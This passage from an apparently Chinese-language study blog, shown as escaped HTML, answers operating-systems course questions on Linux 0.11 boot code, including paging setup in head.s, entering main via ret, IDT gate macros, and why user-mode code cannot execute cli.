class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;head.s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.align &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setup_paging:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $&lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,%ecx		&lt;span class=&#34;comment&#34;&gt;/* 5 pages - pg_dir+4 page tables */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	xorl %eax,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	xorl %edi,%edi			&lt;span class=&#34;comment&#34;&gt;/* pg_dir is at 0x000 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cld;rep;stosl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $pg0+&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,_pg_dir		&lt;span class=&#34;comment&#34;&gt;/* set present bit/user r/w  111 */&lt;/span&gt;   ;&lt;span class=&#34;number&#34;&gt;111&lt;/span&gt; 已分页  三特权? 可读写&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $pg1+&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,_pg_dir+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;/*  --------- &amp;quot; &amp;quot; ---------				 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $pg2+&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,_pg_dir+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;/*  --------- &amp;quot; &amp;quot; --------- */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $pg3+&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,_pg_dir+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;/*  --------- &amp;quot; &amp;quot; --------- */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $pg3+&lt;span class=&#34;number&#34;&gt;4092&lt;/span&gt;,%edi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $&lt;span class=&#34;number&#34;&gt;0xfff007&lt;/span&gt;,%eax		&lt;span class=&#34;comment&#34;&gt;/*  16Mb - 4096 + 7 (r/w user,p) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;std&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:	stosl			&lt;span class=&#34;comment&#34;&gt;/* fill pages backwards - more efficient :-) */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	subl $&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jge &lt;span class=&#34;number&#34;&gt;1b&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	xorl %eax,%eax		&lt;span class=&#34;comment&#34;&gt;/* pg_dir is at 0x0000 */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl %eax,%cr3		&lt;span class=&#34;comment&#34;&gt;/* cr3 - page directory start 恒等映射 物理 = 线性*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl %cr0,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	orl $&lt;span class=&#34;number&#34;&gt;0x80000000&lt;/span&gt;,%eax &lt;span class=&#34;comment&#34;&gt;/*打开分页*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl %eax,%cr0		&lt;span class=&#34;comment&#34;&gt;/* set paging (PG) bit */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ret			&lt;span class=&#34;comment&#34;&gt;/* this also flushes prefetch-queue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				 ; 切换到main函数&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;页目录表、页表、页&#34;&gt;&lt;a href=&#34;#页目录表、页表、页&#34; class=&#34;headerlink&#34; title=&#34;页目录表、页表、页&#34;&gt;&lt;/a&gt;页目录表、页表、页&lt;/h2&gt;&lt;p&gt;一个页目录表项是4byte,也就是32位,通过它来寻址一个页表, 页目录表一共4* 1024 &amp;#x3D; 4k大小&lt;/p&gt;
&lt;p&gt;一个页表也是4byte,每一个页表有1024个页表项,也是 4k 占用一页&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled4.png&#34; alt=&#34;Untitled4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;开始的前7个页是什么意思呢&#34;&gt;&lt;a href=&#34;#开始的前7个页是什么意思呢&#34; class=&#34;headerlink&#34; title=&#34;开始的前7个页是什么意思呢?&#34;&gt;&lt;/a&gt;开始的前7个页是什么意思呢?&lt;/h2&gt;&lt;p&gt;p39&lt;/p&gt;
&lt;p&gt;也就是前7个4k, 第一个4k是页目录表,第2~7个4k是第一个页表的&lt;/p&gt;
&lt;p&gt;赵炯p78&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled5.png&#34; alt=&#34;Untitled4&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;挂接关系图p39&#34;&gt;&lt;a href=&#34;#挂接关系图p39&#34; class=&#34;headerlink&#34; title=&#34;挂接关系图p39&#34;&gt;&lt;/a&gt;挂接关系图p39&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled6.png&#34; alt=&#34;Untitled6&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;10-在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？&#34;&gt;&lt;a href=&#34;#10-在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？&#34; class=&#34;headerlink&#34; title=&#34;10.在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？&#34;&gt;&lt;/a&gt;10.在head程序执行结束的时候，在idt的前面有184个字节的head程序的剩余代码，剩余了什么？为什么要剩余？&lt;/h1&gt;&lt;h1 id=&#34;11-为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。&#34;&gt;&lt;a href=&#34;#11-为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;11.为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。&#34;&gt;&lt;/a&gt;11.为什么不用call，而是用ret“调用”main函数？画出调用路线图，给出代码证据。&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/ISyaX5zPWRw_d-9zvZUPUg&#34;&gt;https://mp.weixin.qq.com/s/ISyaX5zPWRw_d-9zvZUPUg&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;因为main函数是整个系统的运行函数,它不能被call,没有比它等级更高的,call的话是需要返回的,main不需要返回,main结束了,就关机了(&lt;/p&gt;
&lt;p&gt;正常函数调用是会把eip(被掉函数返回时 返回的地址) 进行压栈, ret的时候取出来,进入到这里继续执行,main不能被调用,但可以伪造被调用的假象,然后也进行ret,就可以进入到main里了&lt;/p&gt;
&lt;h2 id=&#34;调用路线图-p42&#34;&gt;&lt;a href=&#34;#调用路线图-p42&#34; class=&#34;headerlink&#34; title=&#34;调用路线图 p42&#34;&gt;&lt;/a&gt;调用路线图 p42&lt;/h2&gt;&lt;p&gt;正常的call&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled7.png&#34; alt=&#34;Untitled7&#34;&gt;&lt;/p&gt;
&lt;p&gt;模仿的call&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled8.png&#34; alt=&#34;Untitled8&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;代码head-s&#34;&gt;&lt;a href=&#34;#代码head-s&#34; class=&#34;headerlink&#34; title=&#34;代码head.s&#34;&gt;&lt;/a&gt;代码head.s&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;startup_32:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jmp after_page_tables&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;after_page_tables:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;		# These are the parameters to main :-)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl $L6		&lt;span class=&#34;meta&#34;&gt;# return address for main, &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; it decides to.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl $_main    ; 后面把这个pop出来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jmp setup_paging&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setup_paging:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ret ;回到main函数&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/ucas-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%80%9D%E8%80%83%E9%A2%98%E4%B8%8A/Untitled9.png&#34; alt=&#34;Untitled9&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;12-用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set-trap-gate-0-amp-divide-error-），并给出代码证据。&#34;&gt;&lt;a href=&#34;#12-用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set-trap-gate-0-amp-divide-error-），并给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;12.用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set_trap_gate(0,&amp;amp;divide_error)），并给出代码证据。&#34;&gt;&lt;/a&gt;12.用文字和图说明中断描述符表是如何初始化的，可以举例说明（比如：set_trap_gate(0,&amp;amp;divide_error)），并给出代码证据。&lt;/h1&gt;&lt;p&gt;p53页&lt;/p&gt;
&lt;p&gt;&amp;#x2F;init&amp;#x2F;main.c trap_init();&lt;/p&gt;
&lt;p&gt;&amp;#x2F;kernel&amp;#x2F;trap.c  trap_init()&lt;/p&gt;
&lt;p&gt;&amp;#x2F;include&amp;#x2F;asm&amp;#x2F;system.h &lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置中断门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_intr_gate(n,addr) \  &lt;span class=&#34;comment&#34;&gt;// n 中断号 addr 中断程序偏移地址&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	_set_gate(&amp;amp;idt[n],&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,addr)  &lt;span class=&#34;comment&#34;&gt;//&amp;amp;idt[n]对应中断号在中断描述符表中的偏移值；中断描述符的类型是 14，特权级是 0。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置陷阱门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_trap_gate(n,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	_set_gate(&amp;amp;idt[n],15,0,addr) &lt;span class=&#34;comment&#34;&gt;// idt表的n项,f,0, 0对应dpl,15对应type ,以二进制来看到&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//设置系统调用门函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_system_gate(n,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	_set_gate(&amp;amp;idt[n],15,3,addr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _set_gate(gate_addr,type,dpl,addr) \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ (&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %%dx,%%ax\n\t&amp;quot;&lt;/span&gt; \ &lt;span class=&#34;comment&#34;&gt;//实现了偏移的拆分&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movw %0,%%dx\n\t&amp;quot;&lt;/span&gt; \        &lt;span class=&#34;comment&#34;&gt;//将偏移的低字给dx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%eax,%1\n\t&amp;quot;&lt;/span&gt; \         &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%edx,%2&amp;quot;&lt;/span&gt; \            &lt;span class=&#34;comment&#34;&gt;//差四字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;short&lt;/span&gt;) (&lt;span class=&#34;number&#34;&gt;0x8000&lt;/span&gt;+(dpl&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;)+(type&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt; (*((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (gate_addr))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;o&amp;quot;&lt;/span&gt; (*(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;+(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (gate_addr))), \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;d&amp;quot;&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *) (addr)),&lt;span class=&#34;string&#34;&gt;&amp;quot;a&amp;quot;&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0x00080000&lt;/span&gt;))  &lt;span class=&#34;comment&#34;&gt;// jump 08》???&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;13-在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0-11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。&#34;&gt;&lt;a href=&#34;#13-在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0-11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。&#34; class=&#34;headerlink&#34; title=&#34;13.在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0.11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。&#34;&gt;&lt;/a&gt;13.在IA-32中，有大约20多个指令是只能在0特权级下使用，其他的指令，比如cli，并没有这个约定。奇怪的是，在Linux0.11中，3特权级的进程代码并不能使用cli指令，这是为什么？请解释并给出代码证据。&lt;/h1&gt;&lt;h2 id=&#34;原因解释&#34;&gt;&lt;a href=&#34;#原因解释&#34; class=&#34;headerlink&#34; title=&#34;原因解释:&#34;&gt;&lt;/a&gt;原因解释:&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;    这个东西和特权级有关(废话),这个是intel的规定,cli和sti与CPL和EFLAGS[IOPL]相关,通过EFLAGS中的IOOPL来保护一些敏感io指令,如cli、sti、in、out等,只有当CPL≤IOPL时才能执行,也就是说当前特权级大于IOPL设置的特权级才可以执行、否则会产生一个一般性保护异常

    IOPL位于EFLAGS的12-13位,只能通过iret改变,linux0.11的0进程,INIT_TASK中IOPL为0,在move_to_user_mode中执行了pushfl\n\t,继承了内核的EFLAGS,所以用户态的3特权级大于IOPL的0特权级,无法调用cli
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;代码&#34;&gt;&lt;a href=&#34;#代码&#34; class=&#34;headerlink&#34; title=&#34;代码:&#34;&gt;&lt;/a&gt;代码:&lt;/h2&gt;&lt;h3 id=&#34;move-to-user-mode&#34;&gt;&lt;a href=&#34;#move-to-user-mode&#34; class=&#34;headerlink&#34; title=&#34;move_to_user_mode&#34;&gt;&lt;/a&gt;move_to_user_mode&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; move_to_user_mode() \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ (&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%esp,%%eax\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;pushfl\n\t&amp;quot;&lt;/span&gt; \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;iret\n&amp;quot;&lt;/span&gt; \ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	:::&lt;span class=&#34;string&#34;&gt;&amp;quot;ax&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;INIT-TASK-include-x2F-linux-x2F-sched-h&#34;&gt;&lt;a href=&#34;#INIT-TASK-include-x2F-linux-x2F-sched-h&#34; class=&#34;headerlink&#34; title=&#34;INIT_TASK include&amp;#x2F;linux&amp;#x2F;sched.h&#34;&gt;&lt;/a&gt;INIT_TASK include&amp;#x2F;linux&amp;#x2F;sched.h&lt;/h3&gt;&lt;p&gt;tss的第10位为0,可以在该文件下找到tss的结构,第10位就是eflags&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span 